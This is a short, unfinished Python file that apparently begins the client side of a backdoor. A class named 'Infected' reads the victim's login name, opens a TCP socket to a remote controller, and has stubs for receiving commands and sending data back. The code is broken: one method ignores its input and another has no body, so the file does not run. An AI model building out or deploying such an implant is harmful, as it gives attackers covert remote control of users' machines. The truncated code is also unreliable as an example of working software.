import os
import socket
class Infected:
    mySocket = 0 ;
    myUser = "";

    def __init__(self,ip,port):
        self.ServerSocket = (ip,port) 
        
    def takeIp(self):
        self.myUser = os.getlogin()
        self.mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
    def apply(self):
        self.mySocket.connect(self.ServerSocket)
        
        
    def reciveCommand(self,command):
        data = ""
        
        self.sendData(data)
        
        
    def sendData(self,data):
        

        
        
        